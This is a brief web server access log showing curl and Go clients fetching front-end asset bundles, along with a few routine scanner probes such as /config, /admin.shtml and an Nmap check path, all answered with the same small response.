59.83.208.108 - - [09/Jun/2024:03:42:37 +0000] "GET /css/chunk-vendors.9821e974.css HTTP/1.1" 200 321069 "http://82.156.202.232:8081/base.cfm" "curl/7.54.0" "-"
59.83.208.107 - - [09/Jun/2024:03:42:38 +0000] "GET /js/chunk-vendors.2f43c38d.js HTTP/1.1" 200 1076477 "http://82.156.202.232:8081/base.cfm" "curl/7.54.0" "-"
95.214.27.7 - - [09/Jun/2024:03:43:32 +0000] "GET /config HTTP/1.1" 200 753 "-" "Go-http-client/1.1" "-"
220.196.160.117 - - [09/Jun/2024:03:59:04 +0000] "GET /admin.shtml HTTP/1.1" 200 753 "-" "curl/7.54.0" "-"
220.196.160.45 - - [09/Jun/2024:03:59:04 +0000] "GET /css/app.1f68041f.css HTTP/1.1" 200 18132 "http://82.156.202.232:8081/admin.shtml" "curl/7.54.0" "-"
220.196.160.146 - - [09/Jun/2024:03:59:04 +0000] "GET /js/app.02be24b7.js HTTP/1.1" 200 81759 "http://82.156.202.232:8081/admin.shtml" "curl/7.54.0" "-"
220.196.160.117 - - [09/Jun/2024:03:59:04 +0000] "GET /css/chunk-vendors.9821e974.css HTTP/1.1" 200 321069 "http://82.156.202.232:8081/admin.shtml" "curl/7.54.0" "-"
220.196.160.117 - - [09/Jun/2024:03:59:05 +0000] "GET /js/chunk-vendors.2f43c38d.js HTTP/1.1" 200 1076477 "http://82.156.202.232:8081/admin.shtml" "curl/7.54.0" "-"
95.214.27.7 - - [09/Jun/2024:04:01:17 +0000] "GET /config HTTP/1.1" 200 753 "-" "Go-http-client/1.1" "-"
42.194.128.111 - - [09/Jun/2024:04:06:01 +0000] "GET /home HTTP/1.1" 200 753 "-" "mozilla/5.0 (iphone; cpu iphone os 13_5_1 like mac os x) applewebkit/605.1.15 (khtml, like gecko) mobile/15e148 micromessenger/7.0.15(0x17000f2b) nettype/4g language/zh_cn miniprogram" "-"
220.196.160.84 - - [09/Jun/2024:04:12:58 +0000] "GET /nmaplowercheck1717877248 HTTP/1.1" 200 753 "-" "curl/7.54.0" "-"
220.196.160.83 - - [09/Jun/2024:04:12:58 +0000] "GET /css/app.1f68041f.css HTTP/1.1" 200 18132 "http://82.156.202.232:8081/nmaplowercheck1717877248" "curl/7.54.0" "-"
220.196.160.51 - - [09/Jun/2024:04:12:58 +0000] "GET /js/app.02be24b7.js HTTP/1.1" 200 81759 "http://82.156.202.232:8081/nmaplowercheck1717877248" "curl/7.54.0" "-"
220.196.160.84 - - [09/Jun/2024:04:12:58 +0000] "GET /js/chunk-vendors.2f43c38d.js HTTP/1.1" 200 1076477 "http://82.156.202.232:8081/nmaplowercheck1717877248" "curl/7.54.0" "-"
220.196.160.45 - - [09/Jun/2024:04:12:59 +0000] "GET /css/chunk-vendors.9821e974.css HTTP/1.1" 200 321069 "http://82.156.202.232:8081/nmaplowercheck1717877248" "curl/7.54.0" "-"
